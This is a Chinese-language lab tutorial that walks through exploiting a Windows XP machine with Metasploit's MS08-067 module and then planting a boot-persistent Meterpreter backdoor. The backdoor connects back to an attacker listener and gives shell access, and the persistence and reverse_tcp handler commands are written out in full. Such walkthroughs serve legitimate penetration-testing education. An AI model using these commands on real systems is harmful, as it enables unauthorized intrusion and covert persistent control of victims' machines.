
# Meterpreter后门种植

# 简介
Metasploit有一个Meterpreter脚本persistence.rb，它将创建一个Meterpreter服务，即使远程系统重新启动，也可以使用该服务在控制了被攻击机之后，通过 kali 的攻击脚本persistence.rb直接将脚本写入到被攻击机，并修改注册表，使得后门开机后自动运行，然后通过kali的handler进行连接，最后获得meterpreter通道


# 创建后门的过程

## 环境准备
攻击机：kali      ip：192.168.1.149<br />目标机：winxp  ip：192.168.1.6


## 操作步骤
1、先攻击得到meterpreter([这里可以使用ms08-067](https://www.yuque.com/xmtxsec/misc/szaees))并执行run persistence命令创建后门<br />（1）先攻击得到meterpreter
```
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 192.168.1.6
msf5 exploit(windows/smb/ms08_067_netapi) > set target 34
msf5 exploit(windows/smb/ms08_067_netapi) > exploit
```
<br />![](https://img-blog.csdnimg.cn/20200604161846906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=SBmyM&originHeight=268&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

（2）创建后门
```
meterpreter > run persistence -X -i 5 -p 2000 -r 192.168.1.149 
X指定启动的方式为开机自启动
-i反向连接的时间间隔(5s) 
–r 指定攻击者的ip
```
<br />![](https://img-blog.csdnimg.cn/20200604161953187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=MNaGl&originHeight=329&originWidth=730&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2、对后门进行利用<br />（1）再打开一个kali终端并运行msfconsole
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.149
msf5 exploit(multi/handler) > set LPORT 2000   ----注意这里的端口号和上面命令中端口号一致
```
<br />![](https://img-blog.csdnimg.cn/2020060416233153.png#crop=0&crop=0&crop=1&crop=1&id=w5jN8&originHeight=156&originWidth=734&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2、XP关机<br />![](https://img-blog.csdnimg.cn/20200604162448365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=v7mGb&originHeight=249&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3、运行exploit<br />msf5 exploit(multi/handler) > exploit   ---开始侦听<br />![](https://img-blog.csdnimg.cn/20200604162535914.png#crop=0&crop=0&crop=1&crop=1&id=O9QWy&originHeight=85&originWidth=548&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4、启动XP，观察exploit的运行情况，可以看到得到一个meterpreter，后门种植是成功的<br />![](https://img-blog.csdnimg.cn/2020060416270798.png#crop=0&crop=0&crop=1&crop=1&id=R8Dor&originHeight=151&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

5、获取目标机的控制权限<br />meterpreter > shell<br />![](https://img-blog.csdnimg.cn/20200604162852291.png#crop=0&crop=0&crop=1&crop=1&id=IPpf2&originHeight=141&originWidth=738&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

到此后门种植成功并成功利用，当攻击机处于侦听状态时，目标机开机运行会自动反弹一个连接到攻击机。
